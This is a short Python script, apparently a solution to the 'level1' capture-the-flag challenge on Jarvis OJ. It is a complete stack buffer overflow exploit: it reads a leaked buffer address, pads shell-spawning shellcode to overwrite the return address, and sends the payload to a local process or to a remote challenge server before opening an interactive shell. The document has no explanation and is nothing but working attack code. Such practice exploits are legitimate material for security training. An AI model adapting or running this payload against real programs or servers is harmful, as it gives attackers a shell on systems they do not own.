from pwn import *
import sys


if len(sys.argv)<2:
	io = process('./level1')
else:
	io = remote("pwn2.jarvisoj.com",9877)

buf_len = 0x88
shellcode = asm(shellcraft.sh())

buf_addr = int(io.recvline()[12:-2],16)
print buf_addr
payload = shellcode.ljust(0x88+4,'a')+p32(buf_addr)

io.sendline(payload)
io.interactive()


